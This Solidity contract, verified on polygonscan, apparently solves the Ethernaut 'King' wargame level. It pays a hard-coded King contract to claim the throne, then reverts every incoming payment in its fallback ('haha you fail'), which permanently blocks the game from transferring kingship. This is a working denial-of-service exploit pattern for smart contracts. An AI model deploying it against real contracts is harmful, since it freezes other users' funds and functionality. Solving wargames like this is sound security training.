/**
 *Submitted for verification at polygonscan.com on 2022-12-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address payable public king = payable(0x2cdcDB49F6710C56333E273AE6369A34521415bA);
    
    // Create a malicious contract and seed it with some Ethers
    function badKing() public payable {
    }
    
    // This should trigger King fallback(), making this contract the king
    function becomeKing() public {
        address(payable(king)).call{value: 1000000000000000}("");
    }
    
    // This function fails "king.transfer" trx from Ethernaut
    fallback() external payable {
        revert("haha you fail");
    }
}